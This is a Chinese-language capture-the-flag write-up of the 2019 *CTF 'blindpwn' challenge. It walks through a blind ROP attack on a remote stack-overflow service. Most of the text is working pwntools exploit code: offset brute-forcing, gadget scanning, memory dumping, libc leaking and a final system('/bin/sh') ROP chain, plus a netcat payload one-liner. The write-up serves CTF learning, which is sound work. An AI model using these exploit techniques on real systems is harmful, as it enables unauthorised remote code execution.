---
title: 2019-Starctf-blindpwn
date: 2019-05-01 21:41:36
tags: [ctf, pwn, wp]
---

第一次盲打 pwn。

<!-- more -->

# Description

```
Close your eyes!

$ nc 34.92.37.22 10000

checksec:
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)

file libc:
libc-2.23.so: ELF 64-bit LSB shared object,
x86-64, version 1 (GNU/Linux), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=b5381a457906d279073822a5ceb2
```

# Analysis

试了一下格式化字符串无果，猜测是栈溢出。尝试爆破溢出的长度，检测脚本：

```python
def find_offset():
    for i in range(1, 500):
        try:
            p = remote('34.92.37.22', 10000)
            p.sendafter('!\n', 'A' * i)
            p.recv()
            p.close()
        except EOFError:
            success('Founded! offset = ' + hex(i - 1))
            break
```

判断出溢出的偏移之后，接下来就是要找 gadget。先尝试自己编译一个类似的程序（`gcc test.c -o test -fno-stack-protector`）：

```cpp
#include <stdio.h>
#include <stdlib.h>

void vul() {
	char buf[0x20];
	puts("Welcome!");
	read(0, buf, 0x100);
	puts("Goodbye!");
}

int main() {
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	vul();
}
```

用 `objdump` 看反汇编基本可以知道 `.text` 段是从 `0x400500` 开始，到将近 `0x400800` 结束。我们要的通用 gadget 在 `__libc_csu_init` 中，就直接尝试从 `0x400600` 开始爆破：

```python
def get_stop_gadget(offset):
    stop_gadget = 0x400000 + 0x600
    stop_gadget_list = []
    while True:
        if stop_gadget > 0x400800:
            return stop_gadget_list
        try:
            p = remote('34.92.37.22', 10000)
            payload = 'A' * offset + p64(stop_gadget)
            p.sendafter('pwn!\n', payload)
            p.recv()
            p.close()
            success('Founded! stop_gadget = ' + hex(stop_gadget))
            stop_gadget_list.append(stop_gadget)
            stop_gadget = stop_gadget + 1
        except Exception:
            stop_gadget = stop_gadget + 1
            p.close()
# [0x4006ce, 0x4006cf, 0x4006dd, 0x4006e2, 0x4006e7, 0x4006ec, 0x4006f1, 0x4006f6, 0x400705, 0x40070a, 0x40070f, 0x400714, 0x400776]
```

拿到了一堆地址，跟据返回地址可以判断第一个肯定是函数开始的地址。后面的应该都是函数中的地址。在一个地址可以看到很多奇怪的输出：

```
[DEBUG] Received 0x1b bytes:
    'Welcome to this blind pwn!\n'
[DEBUG] Sent 0x30 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  ec 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030
[*] Switching to interactive mode
[DEBUG] Received 0x100 bytes:
    00000000  57 65 6c 63  6f 6d 65 20  74 6f 20 74  68 69 73 20  │Welc│ome │to t│his │
    00000010  62 6c 69 6e  64 20 70 77  6e 21 0a 00  47 6f 6f 64  │blin│d pw│n!··│Good│
    00000020  62 79 65 21  0a 00 00 00  01 1b 03 3b  40 00 00 00  │bye!│····│···;│@···│
    00000030  07 00 00 00  44 fd ff ff  8c 00 00 00  a4 fd ff ff  │····│D···│····│····│
    00000040  5c 00 00 00  9a fe ff ff  b4 00 00 00  bf fe ff ff  │\···│····│····│····│
    00000050  d4 00 00 00  02 ff ff ff  f4 00 00 00  54 ff ff ff  │····│····│····│T···│
    00000060  14 01 00 00  c4 ff ff ff  5c 01 00 00  14 00 00 00  │····│····│\···│····│
    00000070  00 00 00 00  01 7a 52 00  01 78 10 01  1b 0c 07 08  │····│·zR·│·x··│····│
    00000080  90 01 07 10  14 00 00 00  1c 00 00 00  40 fd ff ff  │····│····│····│@···│
    00000090  2a 00 00 00  00 00 00 00  00 00 00 00  14 00 00 00  │*···│····│····│····│
    000000a0  00 00 00 00  01 7a 52 00  01 78 10 01  1b 0c 07 08  │····│·zR·│·x··│····│
    000000b0  90 01 00 00  24 00 00 00  1c 00 00 00  b0 fc ff ff  │····│$···│····│····│
    000000c0  50 00 00 00  00 0e 10 46  0e 18 4a 0f  0b 77 08 80  │P···│···F│··J·│·w··│
    000000d0  00 3f 1a 3b  2a 33 24 22  00 00 00 00  1c 00 00 00  │·?·;│*3$"│····│····│
    000000e0  44 00 00 00  de fd ff ff  25 00 00 00  00 41 0e 10  │D···│····│%···│·A··│
    000000f0  86 02 43 0d  06 60 0c 07  08 00 00 00  1c 00 00 00  │··C·│·`··│····│····│
    00000100
Welcome to this blind pwn!
\x00Goodbye!
\x00\x00\x00\x1b\x03;@\x00\x00\x00\x07\x00\x00\x00D????\x00\xa4???\\x00\x9a\xfe\xff\xff\xb4\x00\x00\x00\xbf\xfe\xff\xff?\x00\x00\xff\xff\xff?T\xff\xff\xff\x14\x00\x00??\xff\xff\\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00zR\x00x\x10\x1b\x0c\x0\x90\x07\x10\x14\x00\x00\x00\x1c\x00\x00\x00@???*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00zR\x00x\x10\x1b\x0c\x0\x90\x00\x00$\x00\x00\x00\x1c\x00\x00\x00\xb0???P\x00\x00\x0e\x10F\x0e\x18J\x0f\x0b\x80\x00?\x1a;*3$"\x00\x00\x00\x00\x1c\x00\x00\x00D\x00\x00\x00??\xff\xff%\x00\x00\x00\x00A\x0e\x10\x86C\x06`\x0c\x0\x00\x00\x00\x1c\x00\x00\x00$
```

发生了这种情况，基本可以排除输出函数是 `puts` 还有 `printf` 的可能了，因为只有可能是 `write` 在参数发生错误的时候会输出不一样长度的内容（后来出题人说是因为忘记清空寄存器了）。这里也出现了一个非预期解，因为这个地方直接泄漏了 libc 上的值。放一下 exp：

```python
p = remote('34.92.37.22', 10000)
payload = 'A' * offset + p64(stop_gadget_list[7])
p.recvuntil('!\n')
p.sendline(payload)
libc_start_main = u64(p.recv()[0x48:0x48+8].ljust(8, '\x00')) - 240
success('libc_start_main = ' + hex(libc_start_main))
libc_base = libc_start_main - 0x20740
success('libc_base = ' + hex(libc_base))
one_gadget_offset = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_gadget = libc_base + one_gadget_offset[0]
success('one_gadget = ' + hex(one_gadget))
payload = 'A' * offset + p64(one_gadget)
p.sendline(payload)
p.interactive()
```

下面还是记录一般 brop 中 dump 内存的方法。

基本判断出是 `write` 了之后，可以再定位一下 `call write` 的地址，手工枚举一下附近的几个地址：

```shell
$ python -c "import sys; sys.stdout.write('a'*0x28+'\x14\x07\x40')" | nc 34.92.37.22 10000
 #   #    ####    #####  ######
  # #    #    #     #    #
### ###  #          #    #####
  # #    #          #    #
 #   #   #    #     #    #
          ####      #    #
Welcome to this blind pwn!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@F1? @0?;?F1????;?@|??V??p@F1?|??Z???}|???^}(F1?h??;?ۇ?;?p@F1?%
```

看到直接把我们输入的字符串以及后面的一些东西输出来了，那说明没有传参直接 call 了 `write`。

接下来我们最需要的是在 `__libc_csu_init` 中的 gadgets，想办法爆破出这个地址：

```python
def get_brop_gadget(offset, stop_gadget):
    brop_gadget = 0x400600
    brop_gadget_list = []
    while True:
        if brop_gadget > 0x400800:
            return brop_gadget_list
        p = remote('34.92.37.22', 10000)
        payload = 'A' * offset + p64(brop_gadget) + p64(0) * 6 + p64(stop_gadget)
        p.sendafter('pwn!\n', payload)
        try:
            p.recvuntil('pwn!\n')
        except:
            p.close()
        else:
            success('Founded!' + hex(brop_gadget))
            brop_gadget_list.append(brop_gadget)
            p.close()
        brop_gadget = brop_gadget + 1
# [0x4006ce, 0x4006cf, 0x4006dd, 0x4006e2, 0x4006e7, 0x4006ec, 0x400776]
```

最后一个地址显然和之前不一样，可以判断出是 `__libc_csu_init` 上的 gadgets。然后根据偏移可以得到几条关键指令的地址，也就得到了我们的通用 gadgets：

```
.text:0000000000400700                 mov     rdx, r13
.text:0000000000400703                 mov     rsi, r14
.text:0000000000400706                 mov     edi, r15d
.text:0000000000400709                 call    qword ptr [r12+rbx*8]
.text:000000000040070D                 add     rbx, 1
.text:0000000000400711                 cmp     rbx, rbp
.text:0000000000400714                 jnz     short loc_400700
.text:0000000000400716
.text:0000000000400716 loc_400716:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400716                 add     rsp, 8
.text:000000000040071A                 pop     rbx
.text:000000000040071B                 pop     rbp
.text:000000000040071C                 pop     r12
.text:000000000040071E                 pop     r13
.text:0000000000400720                 pop     r14
.text:0000000000400722                 pop     r15
.text:0000000000400724                 retn
```

拿到了通用 gadget，同时利用前面得到的 `call write`，我们可以把整个 binary 直接 dump 下来：

```python
def leak(start, length):
    elf = ''
    for i in range((length + 0xff) / 0x100):
        p = remote('34.92.37.22', 10000)
        payload = ('A' * offset + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(start + i * 0x100) + p64(0) + p64(call_write)).ljust(0x80, 'A')
        print repr(payload)
        print len(payload)
        p.sendafter('pwn!\n', payload)
        elf += p.recv(0x100)
        p.close()
    return elf
```

拿到程序之后，在 ida 里可以查到 `write` 的 `plt` 和 `got`，接下来就是泄漏然后 `get shell` 了。：

```
LOAD:0000000000400520 sub_400520      proc near               ; CODE XREF: sub_4006CE+28↓p
LOAD:0000000000400520                                         ; sub_4006CE+46↓p
LOAD:0000000000400520                 jmp     cs:qword_601018
LOAD:0000000000400520 sub_400520      endp
```

# Exploit

```python
# start attack
p = remote('34.92.37.22', 10000)
write_plt = 0x400520
write_got = 0x601018
payload = 'A' * offset + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(main)
p.sendafter('pwn!\n', payload)
write = u64(p.recvuntil('\x7f').ljust(8, '\x00'))
success('write = ' + hex(write))
libc_base = write - 0x0f72b0
success('libc_base = ' + hex(libc_base))
# get shell
system = libc_base + 0x045390
str_bin_sh = libc_base + 0x18cd57
payload = 'A' * offset + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)
p.sendafter('pwn!\n', payload)
p.interactive()
```

# References

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#_12
https://n132.github.io/2019/04/29/2019-04-29-Starctf2019-Blindpwn/
http://shift-crops.hatenablog.com/entry/2019/04/30/131154#blindpwn-Pwn-303pt-47-solves
https://balsn.tw/ctf_writeup/20190427-*ctf/#blindpwn
https://github.com/sixstars/starctf2019/blob/master/pwn-blindpwn
